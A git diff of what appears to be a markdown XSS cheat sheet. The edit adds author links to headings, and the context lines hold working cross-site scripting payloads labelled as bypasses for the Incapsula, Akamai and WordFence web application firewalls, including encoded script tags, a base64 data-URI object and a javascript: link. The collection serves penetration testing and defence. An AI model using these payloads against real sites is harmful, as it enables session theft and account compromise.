@@ -769,7 +769,7 @@ Works for CSP like `script-src self`
 
 Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)
 
-### Incapsula WAF Bypass - 8th march
+### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th march
 
 ```javascript
 anythinglr00</script><script>alert(document.domain)</script>uxldz
@@ -777,13 +777,13 @@ anythinglr00</script><script>alert(document.domain)</script>uxldz
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 ```
 
-### Incapsula WAF Bypass - 11th september
+### Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th september
 
 ```javascript
 <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
 ```
 
-### Akamai WAF Bypass by @zseano - 18th june
+### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th june
 
 ```javascript
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
@@ -795,7 +795,7 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
 ```
 
-### WordFence WAF Bypass by @brutelogic - 12th september
+### WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th september
 
 ```javascript
 <a href=javas&#99;ript:alert(1)>
